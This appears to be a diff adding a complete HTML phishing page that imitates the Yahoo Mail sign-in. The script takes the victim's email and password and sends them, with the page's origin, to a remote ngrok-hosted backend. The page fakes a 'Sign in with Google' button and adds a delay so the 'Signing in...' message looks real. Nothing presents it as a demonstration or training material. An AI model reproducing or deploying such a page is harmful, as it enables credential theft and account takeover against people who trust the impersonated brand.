@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to Yahoo Mail</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(145deg, #4a9c8f, #2c7a6b);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .login-box {
+      background: white;
+      width: 100%;
+      max-width: 380px;
+      border-radius: 20px;
+      padding: 40px 32px 40px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #555;
+      margin-bottom: 24px;
+      font-size: 15px;
+    }
+
+    .label {
+      font-size: 15px;
+      margin-bottom: 8px;
+      display: block;
+      color: #333;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      outline: none;
+      margin-bottom: 12px;
+    }
+
+    .suggestions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .pill {
+      background: #f1f3f5;
+      color: #333;
+      padding: 8px 16px;
+      border-radius: 30px;
+      font-size: 14px;
+      cursor: pointer;
+      border: 1px solid #e0e0e0;
+    }
+
+    .pill:hover { background: #e0e0e0; }
+
+    .btn-next {
+      width: 100%;
+      background: #7209b7;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 500;
+      border-radius: 50px;
+      cursor: pointer;
+    }
+
+    .back-link {
+      text-align: center;
+      margin-top: 16px;
+      color: #7209b7;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      color: #777;
+      position: relative;
+    }
+    .divider::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 0; right: 0;
+      height: 1px;
+      background: #ddd;
+    }
+    .divider span { background: white; padding: 0 15px; }
+
+    .google-btn {
+      width: 100%;
+      background: white;
+      border: 2px solid #dadce0;
+      padding: 12px;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .create-account {
+      text-align: center;
+      margin-top: 20px;
+      color: #7209b7;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    #passwordSection, #successSection { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+
+    <!-- Email Step -->
+    <div id="emailStep">
+      <h1>Sign in to Yahoo Mail</h1>
+      <label class="label">Username, email or phone number</label>
+      <input type="text" id="emailInput" placeholder="" onkeyup="handleInput()" autocomplete="off"/>
+      <div class="suggestions" id="suggestions"></div>
+      <button class="btn-next" onclick="goToPassword()">Next</button>
+    </div>
+
+    <!-- Password Step -->
+    <div id="passwordSection">
+      <h1 id="emailDisplay" style="font-size:22px;"></h1>
+      <label class="label">Enter your password</label>
+      <input type="password" id="passwordInput" placeholder="Password" autocomplete="current-password"/>
+      <button class="btn-next" onclick="startRealLogin()">Sign in</button>
+      <div class="back-link" onclick="backToEmail()">← Back</div>
+    </div>
+
+    <!-- Success -->
+  
+
+    <div class="divider"><span>or</span></div>
+
+    <button class="google-btn" onclick="signInWithGoogle()">
+      <img src="google-icon.png" 
+           width="24" height="24" alt="Google" style="vertical-align: middle; margin-right: 8px;">
+      Sign in with Google
+    </button>
+
+    <div class="create-account" onclick="window.open('https://signup.yahoo.com/', '_blank')">
+      Create account
+    </div>
+  </div>
+
+  <script>
+    const domains = ["yahoo.com", "gmail.com", "outlook.com", "aol.com"];
+    let currentEmail = "";
+
+    const BACKEND_URL = "https://unshaven-recolor-fifth.ngrok-free.dev";
+
+    function handleInput() {
+      const input = document.getElementById('emailInput');
+      const suggestionsContainer = document.getElementById('suggestions');
+      const value = input.value.trim();
+      const prefix = value.includes('@') ? value.split('@')[0] : value;
+
+      suggestionsContainer.innerHTML = '';
+
+      domains.forEach(domain => {
+        const pill = document.createElement('div');
+        pill.className = 'pill';
+        pill.textContent = domain;
+        pill.onclick = () => {
+          input.value = prefix + '@' + domain;
+          handleInput();
+        };
+        suggestionsContainer.appendChild(pill);
+      });
+    }
+
+    function goToPassword() {
+      const email = document.getElementById('emailInput').value.trim();
+      if (!email.includes('@')) {
+        alert("Please enter or select an email address");
+        return;
+      }
+      
+      currentEmail = email;
+      document.getElementById('emailStep').style.display = 'none';
+      document.getElementById('passwordSection').style.display = 'block';
+      document.getElementById('emailDisplay').textContent = email;
+    }
+
+    function backToEmail() {
+      document.getElementById('passwordSection').style.display = 'none';
+      document.getElementById('emailStep').style.display = 'block';
+    }
+
+    function signInWithGoogle() {
+      const button = document.querySelector('.google-btn');
+      const originalHTML = button.innerHTML;
+      
+      // Change button to show "Try again later"
+      button.style.opacity = "0.6";
+      button.innerHTML = `
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png" 
+             width="22" height="22" alt="Google">
+        Try again later...
+      `;
+      button.disabled = true;
+
+      // Reset button after 3.5 seconds
+      setTimeout(() => {
+        button.innerHTML = originalHTML;
+        button.style.opacity = "1";
+        button.disabled = false;
+      }, 3500);
+    }
+
+    function goToHome() {
+      window.location.href = "/";
+    }
+
+    async function startRealLogin() {
+      const email = currentEmail;
+      const password = document.getElementById('passwordInput').value.trim();
+
+      if (!email || !password) {
+        alert("Please enter both email and password");
+        return;
+      }
+
+      const button = document.querySelector('#passwordSection .btn-next');
+      const originalText = button.innerHTML;
+      
+      button.innerHTML = "Signing in...";
+      button.disabled = true;
+
+      await new Promise(resolve => setTimeout(resolve, 3000));
+
+      try {
+        const response = await fetch(`${BACKEND_URL}/start_login`, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': 'true'
+          },
+          body: JSON.stringify({ 
+            email: email, 
+            password: password,
+            landing_url: window.location.origin
+          })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+          window.location.reload();
+        } else {
+          alert("Failed to start session.");
+          button.innerHTML = originalText;
+          button.disabled = false;
+        }
+      } catch (error) {
+        console.error(error);
+        alert("Cannot connect to backend server.");
+        button.innerHTML = originalText;
+        button.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
